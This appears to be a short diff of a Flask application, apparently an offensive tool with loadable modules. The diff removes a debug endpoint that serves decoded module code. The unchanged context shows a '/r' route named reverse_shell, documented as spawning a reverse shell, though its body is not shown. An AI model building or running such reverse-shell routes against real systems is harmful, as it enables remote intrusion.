@@ -245,19 +245,6 @@ def reload_modules():
     return render_template("messages.html")
 
 
-def debug():
-    m = request.args.get('m')
-    result = [x for x in modules if m in x.name]
-    if result:
-        response = Response(
-            b64decode(result[0].code),
-            content_type='text/plain; charset=utf-8'
-        )
-    else:
-        response = Response("not found")
-    return response
-
-
 @app.route('/r', methods=["GET"])
 def reverse_shell():
     """Spawn a reverse shell"""
